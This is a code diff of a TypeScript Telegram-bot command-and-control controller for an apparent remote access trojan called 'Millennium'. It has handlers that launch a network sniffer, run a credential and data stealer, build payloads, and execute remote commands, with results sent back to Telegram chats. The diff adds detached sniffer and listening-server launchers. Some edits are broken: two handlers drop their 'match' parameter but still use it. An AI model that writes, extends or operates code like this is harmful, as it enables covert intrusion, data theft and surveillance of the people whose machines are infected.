@@ -1,4 +1,3 @@
-
 import TelegramBot from 'node-telegram-bot-api';
 import { storage } from './storage';
 import { spawn, exec } from 'child_process';
@@ -77,7 +76,7 @@ class TelegramC2Controller {
       bot.onText(/\/help/, (msg) => this.handleHelp(msg, user));
 
       console.log(`🤖 Enhanced Telegram C2 Bot initialized for user: ${user.username}`);
-      
+
       // Send initialization message
       await bot.sendMessage(user.chatId, `
 🚀 **MILLENNIUM C2 SYSTEM ONLINE**
@@ -138,10 +137,10 @@ Type /help for command reference
   async handleSniffer(msg: any, match: any, user: BotUser) {
     try {
       const params = match[1]?.trim() || 'all';
-      const [interface, duration] = params.split(' ');
-      
+      const [networkInterface, duration] = params.split(' ');
+
       const executionId = `sniffer_${Date.now()}`;
-      
+
       // Start network sniffer with enhanced capabilities
       const snifferCommand = [
         'python3', 
@@ -149,9 +148,9 @@ Type /help for command reference
         '--mode', 'sniffer',
         '--telegram-token', user.botToken,
         '--chat-id', user.chatId.toString(),
-        '--interface', interface || 'all'
+        '--interface', networkInterface || 'all'
       ];
-      
+
       if (duration) {
         snifferCommand.push('--duration', duration);
       }
@@ -179,7 +178,7 @@ Type /help for command reference
 🔍 **NETWORK SNIFFER DEPLOYED** 🔍
 
 **Execution ID:** \`${executionId}\`
-**Interface:** ${interface || 'ALL'}
+**Interface:** ${networkInterface || 'ALL'}
 **Duration:** ${duration || 'UNLIMITED'}
 **Capabilities:**
 • Deep packet inspection
@@ -215,7 +214,7 @@ Type /help for command reference
         execution.status = code === 0 ? 'completed' : 'failed';
         execution.endTime = new Date();
         this.snifferProcesses.delete(user.id);
-        
+
         bot?.sendMessage(msg.chat.id, `
 🏁 **SNIFFER OPERATION COMPLETE**
 **Execution ID:** \`${executionId}\`
@@ -227,7 +226,7 @@ Type /help for command reference
       // Emit to web panel
       this.io.to('admin').emit('telegramSniffer', {
         user: user.username,
-        interface: interface || 'all',
+        interface: networkInterface || 'all',
         status: 'active',
         executionId
       });
@@ -244,7 +243,7 @@ Type /help for command reference
   async handleStealer(msg: any, user: BotUser) {
     try {
       const executionId = `stealer_${Date.now()}`;
-      
+
       const stealerCommand = [
         'python3',
         'python_tools/millennium_rat_toolkit.py',
@@ -303,7 +302,7 @@ Type /help for command reference
       stealerProcess.on('exit', (code) => {
         execution.status = code === 0 ? 'completed' : 'failed';
         execution.endTime = new Date();
-        
+
         bot?.sendMessage(msg.chat.id, `
 ✅ **DATA COLLECTION COMPLETE**
 **Execution ID:** \`${executionId}\`
@@ -380,7 +379,7 @@ Agents will auto-report to this chat upon connection.
     }
   }
 
-  async handleBuild(msg: any, match: any, user: BotUser) {
+  async handleBuild(msg: any, user: BotUser) {
     if (user.role === 'analyst') {
       const bot = this.bots.get(user.id);
       if (bot) {
@@ -391,7 +390,7 @@ Agents will auto-report to this chat upon connection.
 
     try {
       const buildTarget = match[1]?.trim() || 'help';
-      
+
       const buildMessage = `
 🏗️ **PAYLOAD BUILDER ACTIVE** 🏗️
 
@@ -422,7 +421,7 @@ Agents will auto-report to this chat upon connection.
         ];
 
         const buildProcess = spawn(buildCommand[0], buildCommand.slice(1));
-        
+
         buildProcess.on('exit', (code) => {
           const bot = this.bots.get(user.id);
           bot?.sendMessage(msg.chat.id, `
@@ -444,7 +443,7 @@ Agents will auto-report to this chat upon connection.
     }
   }
 
-  async handleExecute(msg: any, match: any, user: BotUser) {
+  async handleExecute(msg: any, user: BotUser) {
     if (user.role === 'analyst') {
       const bot = this.bots.get(user.id);
       if (bot) {
@@ -464,7 +463,7 @@ Agents will auto-report to this chat upon connection.
       }
 
       const executionId = `exec_${Date.now()}`;
-      
+
       const execMessage = `
 ⚡ **REMOTE COMMAND EXECUTION** ⚡
 
@@ -555,7 +554,7 @@ ${result || '**No output**'}
   async handleLogs(msg: any, match: any, user: BotUser) {
     try {
       const tool = match[1]?.trim() || 'all';
-      
+
       const executions = Array.from(this.activeExecutions.values())
         .filter(exec => tool === 'all' || exec.tool === tool)
         .slice(-10); // Last 10 executions
@@ -572,7 +571,7 @@ ${result || '**No output**'}
         const duration = exec.endTime 
           ? Math.round((exec.endTime.getTime() - exec.startTime.getTime()) / 1000)
           : 'Running';
-          
+
         logsMessage += `
 **${exec.id}**
 Tool: ${exec.tool} | Status: ${exec.status}
@@ -610,7 +609,7 @@ ${exec.output.slice(-100)}${exec.output.length > 100 ? '...' : ''}
           console.error('Error killing process:', e);
         }
       }
-      
+
       this.snifferProcesses.clear();
       this.activeExecutions.clear();
 
@@ -733,7 +732,7 @@ ${recentVisitors.slice(0, 3).map(v =>
   }
 
   // Additional methods for comprehensive C2 operations...
-  
+
   async addUser(userData: BotUser) {
     await this.createBotInstance(userData);
   }
@@ -760,6 +759,130 @@ ${recentVisitors.slice(0, 3).map(v =>
     }
     return false;
   }
+
+  async executeSnifferCommand(userId: number, { networkInterface, duration, outputFile }: any) {
+        try {
+            const user = await storage.findTelegramUser(userId);
+            if (!user) {
+                console.warn(`User not found: ${userId}`);
+                return;
+            }
+
+            const snifferCommand = [
+                'python3',
+                'python_tools/millennium_rat_toolkit.py',
+                '--start-sniffer',
+                '--interface', networkInterface || 'all',
+                '--duration', duration || '300',
+                '--output', outputFile || 'captured_traffic.json'
+            ];
+
+            const snifferProcess = spawn(snifferCommand[0], snifferCommand.slice(1), {
+                detached: true,
+                stdio: ['ignore', 'pipe', 'pipe']
+            });
+
+            if (!snifferProcess) {
+                console.error("Failed to start sniffer process.");
+                return;
+            }
+
+            this.snifferProcesses.set(userId, snifferProcess);
+
+            snifferProcess.on('exit', (code) => {
+                console.log(`Sniffer process exited with code ${code}`);
+                this.snifferProcesses.delete(userId);
+            });
+
+            snifferProcess.stdout?.on('data', (data) => {
+                console.log(`Sniffer Output: ${data}`);
+            });
+
+            snifferProcess.stderr?.on('data', (data) => {
+                console.error(`Sniffer Errors: ${data}`);
+            });
+
+            // Analytics
+            await storage.logAnalyticsEvent({
+                metric: 'millennium_sniffer_start',
+                value: JSON.stringify({
+                    networkInterface,
+                    duration,
+                    outputFile,
+                    pid: snifferProcess.pid,
+                    timestamp: new Date().toISOString(),
+                    userId
+                })
+            });
+
+            return snifferProcess.pid;
+
+        } catch (error) {
+            console.error("Error executing sniffer command:", error);
+            throw error;
+        }
+    }
+
+    async executeServerCommand(userId: number, { port, networkInterface }: any) {
+        try {
+            const user = await storage.findTelegramUser(userId);
+            if (!user) {
+                console.warn(`User not found: ${userId}`);
+                return;
+            }
+
+            const serverCommand = [
+                'python3',
+                'python_tools/millennium_rat_toolkit.py',
+                '--start-server',
+                '--port', port || '8888',
+                '--interface', networkInterface || '0.0.0.0'
+            ];
+
+            const serverProcess = spawn(serverCommand[0], serverCommand.slice(1), {
+                detached: true,
+                stdio: ['ignore', 'pipe', 'pipe']
+            });
+
+            if (!serverProcess) {
+                console.error("Failed to start server process.");
+                return;
+            }
+
+            this.snifferProcesses.set(userId, serverProcess);
+
+            serverProcess.on('exit', (code) => {
+                console.log(`Server process exited with code ${code}`);
+                this.snifferProcesses.delete(userId);
+            });
+
+            serverProcess.stdout?.on('data', (data) => {
+                console.log(`Server Output: ${data}`);
+            });
+
+            serverProcess.stderr?.on('data', (data) => {
+                console.error(`Server Errors: ${data}`);
+            });
+
+            // Analytics
+            await storage.logAnalyticsEvent({
+                metric: 'millennium_server_start',
+                value: JSON.stringify({
+                    port,
+                    networkInterface,
+                    pid: serverProcess.pid,
+                    timestamp: new Date().toISOString(),
+                    userId
+                })
+            });
+
+            return serverProcess.pid;
+
+        } catch (error) {
+            console.error("Error executing server command:", error);
+            throw error;
+        }
+    }
 }
 
 export { TelegramC2Controller, BotUser, ToolExecution };
